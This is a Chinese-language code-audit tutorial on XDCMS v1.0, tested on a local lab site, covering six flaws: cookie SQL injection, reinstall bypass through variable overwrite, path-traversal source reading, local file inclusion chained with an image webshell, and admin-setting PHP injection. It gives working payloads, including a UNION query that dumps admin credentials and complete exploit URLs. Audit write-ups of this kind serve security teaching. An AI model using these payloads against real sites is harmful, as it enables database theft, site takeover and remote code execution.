

本次代码审计案例为：
1、  COOKIES 注入代码分析与漏洞利用(利用工具的使用)；
2、  全局变量的覆盖代码分析与漏洞利用；
3、  后台任意源码读取；
4、  本地包含代码分析与漏洞利用；
5、  后台getshell 代码分析 与利用；
6、  利用二次漏洞拿shell。

1、本地搭建网站


案例1：COOKIES注入分析 （为了方便区别代码部分采用贴图，实例代码请大家自己下载源码查看）
文件：/ system/modules/member/index.php
代码：


$userid=$_COOKIE['member_userid'];  //用$_COOKIE接收，未做任何过滤

$info=$this->mysql->get_one("select * from ".DB_PRE."member where `userid`=$userid");
//直接带入到sql中查询。没有单引号不用考虑GPC
利用工具：
火狐浏览器 + EDIT COOKIES插件(下载地址请百度)

利用方法/步骤：
1、/index.php?m=member&f=register 随便注册一个账号并登录；
2、/index.php?m=member&f=edit 进入资料管理页面






语句：-1 Union seLect 1,2,username,4,5,6,7,8,9,10,11,12,password,14,15 fRom c_admin



案例二：全局变量的覆盖
文件：/ install/index.php
代码：


代码的意思是把传入的变量数组遍历赋值,比如 $_GET[‘a’]  赋值为 $a
Ok ，继续往下看

传入一个insLockfile判断是否存在。问题在这



将直接跳过判断进行安装。
此时安装的sql数据库文件会记录在 /data/config.inc.php
利用poc:找到可外连的 mysql  (自己去爆破)
直接访问此地址
http://192.168.232.132/xdcmsv10/install/index.php?insLockfile=1&step=4&dbhost=localhost&dbname=xdcms&dbuser=root&dbpwd=root&dbpre=c_&dblang=gbk&adminuser=xdcms&adminpwd=xdcms
加粗部分填写配置   直接绕过 重装




案例三：后台任意源码读取
漏洞文件:system\modules\xdcms\template.php
初看了下后台木有getShell 的地方,ok 还是来老实审计代码吧。
在xdcms  目录下看到 template  文件,目测是后台模板编辑,访问之

HTTP://192.168.232.132/xdcmsv10/index.php?m=xdcms&c=template




额  xdcms 真心有些贱了,写了模板编辑后台又不实用
访问 http://192.168.232.132/xdcmsv10/index.php?m=xdcms&c=template&f=edit&file=../../../data/config.inc.php

Mysql相关的问题





编辑模板直接xss



 

再次进行修改  在登录另一个dedecms的网站的情况下 进行设置





存储型的cookie


案例4：本地包含漏洞
文件：/api/index.php
代码：


问题参数$c 有一个safe_replace函数我们追踪一下看看


这个等于没过滤一样的。

利用方法：http://192.168.232.132/xdcmsv10 /api/index.php?c=xxxxxx%00   xxx代表网马地址%00是截断
   这时候的php版本必须是小于5.3的才能使用%00阶段 



在这里就直接配合文件上传 上传一个图片马 直接进行getshell







/xdcmsv10/uploadfile/image/20180911/20180911135406_60561.jpg

这是图片地址

再使用文件包含 进行利用 构造地址

http://192.168.232.132/xdcmsv10 /api/index.php?c=../../xdcmsv10/uploadfile/image/20180911/20180911135406_60561.jpg%00






案例5：后台getshell 代码分析（这个危害比较大 容易让系统崩溃）

文件：/ system/modules/xdcms/ setting.php

代码：





又是用foreach来数组遍历附值。这里的$info['siteurl']是没有经过处理就直接写进来了。

利用方法：/index.php?m=xdcms&c=setting


测试我就只加了这个phpinfo     ');?><?php phpinfo();?>http://127.0.0.1/ 
效果

 Xdcmsv10/System/xdcms.inc.php

http://192.168.232.132/xdcmsv10/index.php?m=xdcms&c=setting#


因为有单引号，所以这个方法有点鸡肋。

案例6：结合我们的后台直接getshell 进行处理
上传后得到的地址：/uploadfile/image/20120624/xxxxx.jpg